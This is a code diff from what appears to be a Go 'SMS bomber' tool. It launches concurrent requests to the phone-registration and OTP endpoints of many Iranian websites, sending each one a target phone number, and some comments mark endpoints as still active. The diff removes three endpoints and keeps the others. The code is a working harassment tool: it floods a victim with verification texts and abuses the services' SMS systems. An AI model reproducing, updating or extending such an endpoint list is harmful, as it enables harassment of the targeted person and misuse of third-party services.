@@ -210,12 +210,6 @@ func main() {
 		go sms("https://simkhanapi.ir/api/users/registerV2", map[string]interface{}{
 			"mobileNumber": phone,
 		}, ch)  // edit :4/22/2025
-		go sms("https://sandbox.sibirani.ir/api/v1/user/invite", map[string]interface{}{
-			"username": phone,
-		}, ch) // active ✅
-		go sms("https://sandbox.sibirani.com/api/v1/developer/generator-inv-token", map[string]interface{}{
-			"username": phone,
-		}, ch) // active ✅
 		go sms("https://api.abantether.com/api/v2/auths/register/phone/send", map[string]interface{}{
 			"phone_number": phone,
 		}, ch)  // edit :4/22/2025
@@ -261,9 +255,6 @@ func main() {
 		go sms("https://mashinbank.com/api2/users/check", map[string]interface{}{
 			"mobileNumber": phone,
 		}, ch)  // edit :4/22/2025
-		go sms("https://api.pezeshket.com/core/v1/auth/requestCodeByMobile", map[string]interface{}{
-			"mobileNumber": phone,
-		}, ch)  // active ✅
 		go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
 			"'method': 'phone', 'identifier'": phone,
 		}, ch)
